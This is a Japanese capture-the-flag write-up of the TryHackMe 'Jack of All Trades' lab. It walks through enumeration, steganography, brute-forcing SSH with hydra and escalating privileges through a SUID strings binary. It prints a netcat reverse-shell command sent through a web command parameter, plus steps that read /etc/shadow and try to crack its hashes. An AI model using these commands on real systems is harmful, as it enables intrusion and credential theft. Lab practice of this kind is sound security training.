# Jack of All Trades CTF

https://tryhackme.com/r/room/jackofalltrades

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-128-233:~# TARGET=10.10.182.218
root@ip-10-10-128-233:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-31 01:21 GMT
Nmap scan report for 10.10.182.218
Host is up (0.00026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:7B:A5:75:FF:6B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds
root@ip-10-10-128-233:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-31 01:21 GMT
Nmap scan report for 10.10.182.218
Host is up (0.00011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
MAC Address: 02:7B:A5:75:FF:6B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds
```

HTTPが22で、SSHが80・・・？  
firefox で、network.security.ports.banned.override を 1-9999に設定。

### gobuster

```shell
root@ip-10-10-128-233:~# gobuster dir -u http://$TARGET:22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.182.218:22
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 318] [--> http://10.10.182.218:22/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
root@ip-10-10-128-233:~# gobuster dir -x php,txt,html -u http://$TARGET:22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.182.218:22
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://10.10.182.218:22/assets/]
/index.html           (Status: 200) [Size: 1605]
/.html                (Status: 403) [Size: 278]
/recovery.php         (Status: 200) [Size: 943]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

### トップページのソースコメント
```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```

```shell
$ echo UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

何かのパスワード：u?WtKSraq

### /recovery.php
```html
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```

base32、base16、Rot13デコード

```shell
$ echo GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= | base32 -d | base16 -d  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

bit.ly/2TvYQ2S にブラウザでアクセスすると、
https://en.wikipedia.org/wiki/Stegosauria になる。

Stegosauria / u?WtKSraq  
Stegosaurs / u?WtKSraq  
Jack / u?WtKSraq  
でログインを試したが、失敗。意図が不明。

### stego = ステガノグラフィ？

ホームページにステゴサウルスの画像があるので調べてみる。  
パスワード：u?WtKSraq で開けた。

```shell
$ steghide --extract -sf ./stego.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".

$ ls
creds.txt  jackinthebox.jpg  stego.jpg

$ cat creds.txt                          
Hehe. Gotcha!

You're on the right path, but wrong image!

$ steghide --extract -sf ./jackinthebox.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

$ steghide --extract -sf ./header.jpg      
Enter passphrase: 
wrote extracted data to "cms.creds".

$ cat cms.creds
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

Username: jackinthebox  
Password: TplFxiSHjY

### /recovery.php でログイン

```text
GET me a 'cmd' and I'll run it for you Future-Jack.
```

http://10.10.182.218:22/nnxhweOV/index.php?cmd=pwd  
のようにするとコードを実行できる。

リバースシェル  
http://10.10.182.218:22/nnxhweOV/index.php?cmd=nc.traditional%20-e%20/bin/bash%2010.2.22.182%201234

```text
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.182.218] 57646
pwd
/var/www/html/nnxhweOV
ls
index.php
ls -al /home
total 16
drwxr-xr-x  3 root root 4096 Feb 29  2020 .
drwxr-xr-x 23 root root 4096 Feb 29  2020 ..
drwxr-x---  3 jack jack 4096 Feb 29  2020 jack
-rw-r--r--  1 root root  408 Feb 29  2020 jacks_password_list
cat /home/jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

パスワードリストを pwlist.txt として保存する。

### SSH
```shell
$ hydra -l jack -P pwlist.txt 10.10.182.218 -s 80 ssh -t 30 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-30 21:28:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 24 tasks per 1 server, overall 24 tasks, 24 login tries (l:1/p:24), ~1 try per task
[DATA] attacking ssh://10.10.182.218:80/
[80][ssh] host: 10.10.182.218   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-30 21:28:15
```

jack / ITMJpGGIqg1jn?>@  
と判明。

```shell
$ ssh jack@10.10.182.218 -p 80
The authenticity of host '[10.10.182.218]:80 ([10.10.182.218]:80)' can't be established.
ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.182.218]:80' (ED25519) to the list of known hosts.
jack@10.10.182.218's password: 
jack@jack-of-all-trades:~$ 
```

jackでログイン成功。

```shell
jack@jack-of-all-trades:~$ ls -al /home/jack
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
```

jpgをどうやってkaliに持ってくるか問題。

- ターゲットにpython3が無いのでHTTPサーバーは作れない
- ターゲットにsmbclientが無いので共有アクセスできない
- 両側でnc使う方法は機能しなかった
- ターゲットにSSHがあるからkaliからSCPを使うことは可能か

#### scp

```shell
$ scp -P 80 jack@10.10.182.218:/home/jack/user.jpg ./user.jpg
jack@10.10.182.218's password: 
user.jpg                                                                                                                                                                                                 100%  286KB  49.1KB/s   00:05    
                                                       
$ ls -al     
total 508
drwxrwxr-x  3 kali kali   4096 Dec 30 21:38 .
drwx------ 24 kali kali   4096 Dec 30 21:27 ..
-rw-rw-r--  1 kali kali    281 Dec 30 21:38 @
-rw-rw-r--  1 kali kali     93 Dec 30 21:01 cms.creds
-rw-rw-r--  1 kali kali     58 Dec 30 20:57 creds.txt
-rw-rw-r--  1 kali kali  70273 Dec 30 21:01 header.jpg
-rw-rw-r--  1 kali kali  80742 Dec 30 20:55 jackinthebox.jpg
-rw-rw-r--  1 kali kali    408 Dec 30 21:26 pwlist.txt
drwxrwxr-x  2 kali kali   4096 Dec 30 21:37 share
-rw-rw-r--  1 kali kali  38015 Dec 30 20:55 stego.jpg
-rw-rw-r--  1 kali kali 293302 Dec 30 21:49 user.jpg
```

コピー成功。

画像の中にフラグが書かれてた。
```text
securi-tay2020_{p3ngu1n-hunt3r-extr}
```

## 権限昇格

```shell
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
```
sudoなし。

```shell
jack@jack-of-all-trades:~$ find / -perm 04000 -type f -ls 2>/dev/null
jack@jack-of-all-trades:~$ find / -perm -u=s -type f -ls 2>/dev/null
135127  456 -rwsr-xr-x   1 root     root       464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
134730  288 -rwsr-xr--   1 root     messagebus   294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
135137   12 -rwsr-xr-x   1 root     root        10248 Apr 15  2015 /usr/lib/pt_chown
132828   44 -rwsr-xr-x   1 root     root        44464 Nov 20  2014 /usr/bin/chsh
132795   56 -rwsr-sr-x   1 daemon   daemon      55424 Sep 30  2014 /usr/bin/at
132826   56 -rwsr-xr-x   1 root     root        53616 Nov 20  2014 /usr/bin/chfn
133088   40 -rwsr-xr-x   1 root     root        39912 Nov 20  2014 /usr/bin/newgrp
133270   28 -rwsr-x---   1 root     dev         27536 Feb 25  2015 /usr/bin/strings
133273  148 -rwsr-xr-x   1 root     root       149568 Mar 12  2015 /usr/bin/sudo
133111   56 -rwsr-xr-x   1 root     root        54192 Nov 20  2014 /usr/bin/passwd
132940   76 -rwsr-xr-x   1 root     root        75376 Nov 20  2014 /usr/bin/gpasswd
133161   88 -rwsr-sr-x   1 root     mail        89248 Feb 11  2015 /usr/bin/procmail
138022 3052 -rwsr-xr-x   1 root     root      3124160 Feb 17  2015 /usr/sbin/exim4
    85   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
   131   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
   114   40 -rwsr-xr-x   1 root     root        40168 Nov 20  2014 /bin/su
```
stringsにsuidが付いている。

```shell
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38f}
```

ルートフラグゲット！

## 振り返り
- いろいろな小技が必要で楽しかった。
- 最後は /root/root.xt のパス決め打ちで解決したが、推測できないファイル名だったらどうだったかを検証。
1. shadowからルートパスワードをクラックする
2. sshの秘密鍵を読み取る  
というのが考えられるが、sshの秘密鍵は存在しなさそうなので、shadowハッシュを hashcat でクラックしてみる。

```shell
jack@jack-of-all-trades:~$ strings /etc/shadow
root:$6$b3.jqCVW$RhHJyUpN81dfuW6J..8rTYX..7msovXxtbwQX4w8SIqxTuGOGpuKVft.1Cw1yvpGiHh2LULov1EA5H2m33dPk/:18321:0:99999:7:::
daemon:*:16550:0:99999:7:::
bin:*:16550:0:99999:7:::
sys:*:16550:0:99999:7:::
sync:*:16550:0:99999:7:::
games:*:16550:0:99999:7:::
man:*:16550:0:99999:7:::
lp:*:16550:0:99999:7:::
mail:*:16550:0:99999:7:::
news:*:16550:0:99999:7:::
uucp:*:16550:0:99999:7:::
proxy:*:16550:0:99999:7:::
www-data:*:16550:0:99999:7:::
backup:*:16550:0:99999:7:::
list:*:16550:0:99999:7:::
irc:*:16550:0:99999:7:::
gnats:*:16550:0:99999:7:::
nobody:*:16550:0:99999:7:::
systemd-timesync:*:16550:0:99999:7:::
systemd-network:*:16550:0:99999:7:::
systemd-resolve:*:16550:0:99999:7:::
systemd-bus-proxy:*:16550:0:99999:7:::
uuidd:*:16550:0:99999:7:::
Debian-exim:!:16550:0:99999:7:::
messagebus:*:16550:0:99999:7:::
statd:*:16550:0:99999:7:::
avahi-autoipd:*:16550:0:99999:7:::
sshd:*:16550:0:99999:7:::
jack:$6$X4GueAFP$m2Ovdp1jLV3OX3B40CkxQd0LTk8l2vLr0UplPHA0gm1e5bzwWLRGyUwnU94TdfWzgRjmhLyXOcacx0SE5VshN1:18321:0:99999:7:::
```

```shell
hashcat -m 1800 hash.txt SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt

hashcat -m 1800 hash.txt rockyou.txt
```
割れなかった。単純なパスワードではなさそうなので、ファイル名が分からなければ難しかったと思われる。
